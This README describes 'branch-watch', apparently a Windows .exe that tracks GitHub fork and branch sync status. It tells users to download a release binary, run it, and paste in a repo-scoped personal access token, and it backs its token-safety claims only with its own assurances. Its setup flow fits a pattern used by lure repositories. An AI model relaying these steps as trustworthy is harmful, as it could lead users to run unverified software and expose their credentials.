# 🔍 branch-watch - Track GitHub repository sync status easily

[![Download branch-watch](https://img.shields.io/badge/Download-Branch-Watch-blue)](https://github.com/Angelafragile952/branch-watch)

## 📋 About This Tool

Branch-watch tracks your GitHub repositories to see if they stay current. Many developers work with forks or multiple branches. Over time, these branches drift from the original source. This tool checks your sync status so you know what needs your attention. It uses the GitHub API to gather data on your existing projects and reports the state of your work.

## ⚙️ System Requirements

This application runs on Windows 10 or Windows 11. You need a stable internet connection to communicate with GitHub servers. The software requires roughly 50 megabytes of storage space. You do not need developer tools or coding skills to use this program.

## 🚀 Downloading The Application

1. Visit the [official download page](https://github.com/Angelafragile952/branch-watch).
2. Look for the "Releases" section on the right side of the screen.
3. Click the latest version link.
4. Select the file ending in `.exe` to start your download.
5. Save the file to your desktop or downloads folder.

## 📦 Setting Up Your Environment

Once you download the file, you must authorize your GitHub account.

1. Double-click the downloaded .exe file to open the program.
2. A window appears asking for a Personal Access Token.
3. Click the link labeled "Create GitHub Token" inside the application.
4. Log in to your GitHub account using your web browser.
5. Generate a token with "repo" read permissions.
6. Copy the string of characters GitHub provides.
7. Paste this code into the branch-watch window and press Enter.

## 🖥️ Using The Interface

The main window displays a list of your repositories. Each row shows the repository name and the current sync status.

- Green checkmarks indicate your branch matches the source.
- Yellow exclamation marks show your branch lags behind the main branch.
- Red icons suggest merge conflicts or significant synchronization issues.

To refresh the list, click the "Sync All" button at the top of the window. The tool contacts the GitHub API and updates the status for every repository in your account. You can click on any individual repository to see a detailed view of the differences between your local commits and the original upstream source.

## 🛡️ Managing Your Tokens

Security is important. The application stores your access token in an encrypted format on your local machine. This file remains on your computer hardware and never travels to external servers other than GitHub. You can view or delete your saved tokens by opening the Settings menu and selecting "Manage Credentials."

## 🛠️ Frequently Asked Questions

**Does this tool change my code?**
No. Branch-watch only reads your data. It does not push, pull, or alter your files. It acts as a monitoring tool to provide information.

**How often should I check for updates?**
You can leave the application open in your system tray. It checks your repository status every hour by default. You can change this interval in the settings menu.

**What happens if I lose my internet connection?**
The tool displays a message stating that it failed to reach the server. It keeps the last known sync data visible until your connection returns.

**Can I track organizations?**
Yes. If your GitHub account has permission to view organization repositories, those repositories appear in your list. You can toggle this visibility in the settings menu.

## 📑 Understanding Sync Status

Synchronization refers to the alignment between your local repository and the original source repository, often called the upstream. When you pull changes from the source into your branch, you stay in sync. When the source adds new features or fixes that you have not yet added to your fork, you become out of sync. Branch-watch calculates this difference by looking at the commit history provided by GitHub.

## 💡 Troubleshooting Common Issues

If the application fails to load:
1. Ensure your internet connection functions correctly.
2. Verify that your GitHub token has not expired. Tokens usually last for 30, 60, or 90 days. If your token expires, generate a new one using the steps in the setup section.
3. Restart your computer. This clears temporary memory issues.
4. Check that your Windows Firewall allows the application to access the internet. Branch-watch requires access to the GitHub domain to fetch your data.

## 🤝 Support and Feedback

If you encounter bugs, check the GitHub Issues page at the project repository. You can describe your problem, and other users or contributors may provide a solution. Please include your Windows version and a description of the error message if one appears. This helps improve the tool for everyone.

## 📁 Project Structure

The application relies on several components to function:
- The Core Engine: Manages requests to the GitHub API.
- The Configuration Module: Handles your token and user settings.
- The Display Layer: Renders the lists and status icons you see in the main window.
- The Storage Utility: Saves your project preferences locally.

## ⚡ Performance Tips

- Close unused applications to free up system memory if the tool slows down.
- If you have hundreds of repositories, limit the view to only your active projects using the filter bar.
- Keep the application updated to the latest version to ensure compatibility with changes to the GitHub API.

## 📌 Final Checklist Before Use

- [ ] You have a valid GitHub account.
- [ ] You created a personal access token with repo permissions.
- [ ] You have a stable Wi-Fi or Ethernet connection.
- [ ] You have sufficient permission on your computer to run executable files.

Branch-watch provides a clear view of your development workspace. By keeping track of your branch sync status, you can focus on building features rather than managing repository overhead. This tool removes the manual labor of checking every single fork or branch through an internet browser. Use it to keep your projects organized and ready for your next coding session.